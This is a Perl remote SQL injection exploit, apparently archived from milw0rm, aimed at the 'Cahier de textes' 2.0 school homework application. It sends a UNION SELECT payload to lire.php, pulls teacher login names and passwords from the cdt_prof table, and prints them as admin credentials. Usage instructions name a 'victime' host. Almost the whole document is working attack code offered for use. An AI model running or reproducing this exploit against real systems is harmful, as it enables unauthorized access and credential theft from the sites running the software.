<html><head><title>Cahier de texte 2.0 (lire.php) Remote SQL Injection Exploit</title></head><pre># ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#             Cahier  de  textes  
#   Pierre Lemaitre - St Lô (France) - Ver 2.0
#           
#          Remote SQL injection Exploit
#
#              Discovred By s4mi
#           s4mi[at]linuxmail[dot]org
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# exploit Coded by simo64
#
# all thanks to simo64,drackanz,hardose,r00t 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#
#!/usr/bin/perl

use IO::Socket ;

&amp;header();

&amp;usage unless(defined($ARGV[0] &amp;&amp; $ARGV[1]));

$host = $ARGV[0];
$path = $ARGV[1];

syswrite STDOUT ,&quot;\nConnecting ...&quot;;

my $sock = new IO::Socket::INET ( PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);
								
die &quot;\nUnable to connect to $host\n&quot; unless($sock);

syswrite STDOUT, &quot;[OK]&quot;;

$inject = &quot;1&amp;matiere_ID=-1+union%20select%20null,CONCAT(nom_prof,CHAR(58),CHAR(58),passe)%20FROM%20cdt_prof/*&quot;;	

syswrite STDOUT ,&quot;\nSending Data ...&quot;;

print $sock &quot;GET $path/lire.php?classe_ID=1&amp;matiere_ID=$inject HTTP/1.1\n&quot;;
print $sock &quot;Host: $host\n&quot;;
print $sock &quot;Referer: $host\n&quot;;
print $sock &quot;Accept-Language: en-us\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $sock &quot;User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n&quot;;
print $sock &quot;Cache-Control: no-cache\n&quot;;
print $sock &quot;Connection: Close\n\n&quot;;

syswrite STDOUT ,&quot;[OK]\n\n&quot;;

	while($res = &lt;$sock&gt;){
	#print $res;sleep(1);
		if($res =~ /class=&quot;Style6&quot;&gt;(.*?)::(.*?)&lt;\/td&gt;/){
			print &quot;Exploit Succeded !\n\n&quot;;sleep(1);
			$userlogin = $1 ;
			$userpass  = $2;
			print &quot;adminlogin  : $userlogin\n&quot;;sleep(1);
			print &quot;adminpasswd : $userpass\n&quot;;sleep(1);
			$succeded = &quot;ok&quot;;
			}
		}
if(!defined($succeded)) {print &quot;\nExploit Failed\n&quot;;} else {print &quot;\nEnjoy ;)&quot;;}

sub usage{
	print &quot;\nUsage   : perl $0 host /path/ &quot;;
	print &quot;\nExemple : perl $0 www.victime.net /cahier/\n&quot;;
	exit(0);
}
sub header(){
print q(
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            Cahier  de  textes  v2.0 
   Pierre Lemaitre - St Lô (France) - Ver 2.0

       Remote SQL injection Exploit by s4mi
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
);
}

# milw0rm.com [2006-10-07]</pre></html>